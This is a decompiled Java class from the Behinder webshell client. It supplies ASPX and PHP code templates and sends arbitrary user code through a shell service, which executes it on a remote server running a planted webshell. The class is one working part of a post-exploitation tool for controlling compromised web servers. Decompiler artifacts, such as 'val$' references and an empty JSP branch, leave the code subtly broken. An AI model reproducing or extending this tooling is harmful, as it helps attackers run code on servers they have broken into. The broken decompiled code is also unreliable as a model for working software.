 package net.rebeyond.behinder.ui;
 
 import net.rebeyond.behinder.core.ShellService;
 import org.eclipse.swt.custom.StyledText;
 import org.eclipse.swt.widgets.Button;
 import org.eclipse.swt.widgets.Display;
 import org.eclipse.swt.widgets.Label;
 
 
 
 public class EvalUtils
 {
   private ShellService currentShellService;
   private Label statusLabel;
   private StyledText sourceCodeTxt;
   
   public EvalUtils(ShellService shellService, final Label statusLabel, StyledText sourceCodeTxt)
   {
     this.currentShellService = shellService;
     this.statusLabel = statusLabel;
     this.sourceCodeTxt = sourceCodeTxt;
     Display.getDefault().syncExec(new Runnable() {
       public void run() {
         if (statusLabel.isDisposed())
           return;
         EvalUtils.this.fillSourceCode();
       }
     });
   }
   
 
   public static void main(String[] args) {}
   
 
   private void fillSourceCode()
   {
     if (!this.currentShellService.currentType.equals("jsp"))
     {
 
 
       if (this.currentShellService.currentType.equals("aspx"))
       {
         this.sourceCodeTxt.setText("using System;\r\n\r\npublic class Eval {\r\n\r\n\tpublic void eval(Object obj) {\r\n\r\n\t/**用户自定义代码开始**/\t\r\n\r\n\tSystem.Web.UI.Page page = (System.Web.UI.Page)obj;\r\n\tpage.Response.Write(\"hello world\");\r\n\r\n   /**用户自定义代码结束**/\t\r\n\r\n\t}\r\n}");
 
 
 
 
 
 
 
 
 
 
 
 
 
 
       }
       else if (this.currentShellService.currentType.equals("php"))
       {
         this.sourceCodeTxt.setText("echo 'hello world';"); } }
   }
   
   public void execute(Button btn, final String sourceCode, final StyledText resultTxt) {
     this.statusLabel.setText("正在执行……");
     new Thread() {
       public void run() {
         try {
           final String result = EvalUtils.this.currentShellService.eval(sourceCode);
           Display.getDefault().syncExec(new Runnable() {
             public void run() {
               if (EvalUtils.this.statusLabel.isDisposed())
                 return;
               this.val$resultTxt.setText(result);
               EvalUtils.this.statusLabel.setText("完成。");
             }
           });
         }
         catch (Exception e) {
           e.printStackTrace();
           if (e.getMessage() != null)
           {
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (EvalUtils.this.statusLabel.isDisposed())
                   return;
                 EvalUtils.this.statusLabel.setText("运行失败");
                 this.val$resultTxt.setText(e.getMessage());
               }
             });
           }
         }
       }
     }.start();
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/ui/EvalUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */